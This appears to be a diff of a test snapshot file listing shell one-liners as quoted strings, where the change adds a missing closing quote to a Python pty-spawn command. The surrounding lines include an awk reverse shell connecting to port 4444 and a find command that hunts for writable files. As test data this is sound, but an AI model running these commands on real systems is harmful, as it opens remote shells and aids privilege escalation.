@@ -21,7 +21,7 @@ Array [
     "\\"awk 'BEGIN {s = \\\\\\"/inet/tcp/0/127.0.0.1/4444\\\\\\"; while(42) { do{ printf \\\\\\"shell>\\\\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \\\\\\"exit\\\\\\") close(s); }}' /dev/null\\"",
   ],
   Array [
-    "\\"python -c 'import pty;pty.spawn(\\\\\\"/bin/bash\\\\\\")\\"",
+    "\\"python -c 'import pty;pty.spawn(\\\\\\"/bin/bash\\\\\\")'\\"",
   ],
   Array [
     "\\"find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user USER -perm -u=w ')' -or '(' -group GROUP -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null\\"",
@@ -66,7 +66,7 @@ Array [
     "awk 'BEGIN {s = \\"/inet/tcp/0/127.0.0.1/4444\\"; while(42) { do{ printf \\"shell>\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \\"exit\\") close(s); }}' /dev/null",
   ],
   Array [
-    "python -c 'import pty;pty.spawn(\\"/bin/bash\\")",
+    "python -c 'import pty;pty.spawn(\\"/bin/bash\\")'",
   ],
   Array [
     "find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user USER -perm -u=w ')' -or '(' -group GROUP -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null",
